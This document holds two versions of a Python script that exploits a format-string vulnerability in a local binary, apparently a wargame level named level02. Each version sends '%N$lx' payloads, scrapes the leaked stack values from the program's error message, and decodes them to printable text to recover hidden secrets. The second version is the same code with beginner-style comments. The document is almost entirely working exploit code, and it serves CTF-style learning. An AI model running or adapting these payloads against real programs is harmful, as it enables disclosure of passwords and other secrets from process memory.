python - <<'PY'
import re, struct, subprocess

prog = "/home/users/level02/level02"

def leak(i):
    payload = "%%%d$lx\nx\n" % i
    p = subprocess.Popen([prog], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = p.communicate(payload)[0]
    m = re.search(r"\*+\n(.*) does not have access!", out, re.S)
    return m.group(1).strip() if m else ""

vals = []
for i in range(1, 81):
    v = leak(i)
    if re.match(r"^[0-9a-fA-F]+$", v):
        vals.append((i, v))

print("=== index -> hex ===")
for i, v in vals:
    print("%02d: %s" % (i, v))

print("\n=== printable 8-byte chunks ===")
for i, v in vals:
    n = int(v, 16)
    chunk = struct.pack("<Q", n & 0xffffffffffffffff)
    s = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in chunk)
    if any(ch.isalnum() for ch in s):
        print("%02d: %s" % (i, s))
PY


# ----------------------------------------------------------------------------------------------------------------------

python - <<'PY'
import re, struct, subprocess

PROGRAM = "/home/users/level02/level02"

def peek_at_memory(slot_number):
    # Build the cheat code, e.g. "%1$lx" or "%42$lx"
    cheat_code = "%%%d$lx\n" % slot_number

    # Run the program and send it the cheat code
    process = subprocess.Popen(
        [PROGRAM],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    output = process.communicate(cheat_code)[0]

    # The program responds with "<secret> does not have access!"
    # We grab the <secret> part
    match = re.search(r"\*+\n(.*) does not have access!", output, re.S)
    return match.group(1).strip() if match else ""


# --- Step 1: Peek at 80 memory slots and collect the results ---
print("=== Raw memory dump (hex) ===")
found = []

for slot in range(1, 81):
    value = peek_at_memory(slot)

    # Only keep results that look like hex numbers
    if re.match(r"^[0-9a-fA-F]+$", value):
        found.append((slot, value))
        print("Slot %02d: %s" % (slot, value))


# --- Step 2: Convert hex values to readable text ---
print("\n=== Searching for readable text ===")

for slot, hex_value in found:
    # Convert the hex number to 8 bytes
    number   = int(hex_value, 16)
    as_bytes = struct.pack("<Q", number & 0xffffffffffffffff)

    # Replace unreadable characters with a dot
    as_text = ''.join(
        char if 32 <= ord(char) <= 126 else '.'
        for char in as_bytes
    )

    # Only print if it contains at least one letter or digit
    if any(ch.isalnum() for ch in as_text):
        print("Slot %02d: %s" % (slot, as_text))
PY